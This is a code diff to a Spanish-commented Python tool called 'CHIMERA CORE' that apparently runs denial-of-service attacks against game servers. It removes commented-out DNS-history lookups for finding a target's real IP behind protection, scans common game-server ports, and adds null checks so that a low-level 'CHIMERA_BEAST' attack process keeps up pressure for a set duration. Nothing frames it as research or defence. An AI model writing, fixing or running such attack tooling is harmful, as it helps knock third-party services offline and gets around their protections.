@@ -24,19 +24,6 @@ def advanced_reconnaissance(target_domain):
     print("[CHIMERA CORE] Iniciando reconocimiento avanzado...")
     real_ip = TARGET_IP  # Por defecto
 
-    # Técnica 1: Búsqueda de DNS histórico a través de APIs públicas
-    # (Esto requeriría claves API, pero es el método más efectivo)
-    # Ejemplo conceptual:
-    # try:
-    #     response = requests.get(f"https://securitytrails.com/api/v1/history/{target_domain}/dns", headers={"APIKEY": "TU_API_KEY"})
-    #     if response.status_code == 200:
-    #         data = response.json()
-    #         if data['records']:
-    #             real_ip = data['records'][0]['ip']
-    #             print(f"[CHIMERA CORE] IP real encontrada via SecurityTrails: {real_ip}")
-    # except Exception as e:
-    #     print(f"[CHIMERA CORE] Falló búsqueda en SecurityTrails: {e}")
-
     # Técnica 2: Escaneo de puertos no estándar
     print(f"[CHIMERA CORE] Analizando puertos secundarios en {TARGET_IP}...")
     common_game_ports = [7777, 7778, 7779, 7780, 27015, 27016]
@@ -105,6 +92,7 @@ def deploy_attack_modules(target_ip, target_port, duration, protection_level):
 
     stop_event = threading.Event()
     threads = []
+    beast_process = None
 
     # --- Despliegue del Módulo Beast (Músculo C) ---
     print("[CHIMERA CORE] Desplegando CHIMERA_BEAST (músculo de bajo nivel)...")
@@ -157,14 +145,15 @@ def deploy_attack_modules(target_ip, target_port, duration, protection_level):
             time.sleep(30)
             elapsed = time.time() - start_time
             print(f"[CHIMERA CORE] Tiempo de ataque: {elapsed:.0f}s / {duration}s. Manteniendo presión.")
-            if beast_process.poll() is not None:
+            if beast_process and beast_process.poll() is not None:
                 print("[ADVERTENCIA] El proceso Chimera_Beast ha terminado prematuramente.")
     except KeyboardInterrupt:
         print("\n[CHIMERA CORE] Abortando operación por comando del usuario.")
     finally:
         print("[CHIMERA CORE] Deteniendo todos los módulos...")
         stop_event.set()
-        beast_process.terminate()
+        if beast_process:
+            beast_process.terminate()
         time.sleep(5)
         print("[CHIMERA CORE] Operación Chimera finalizada.")
 
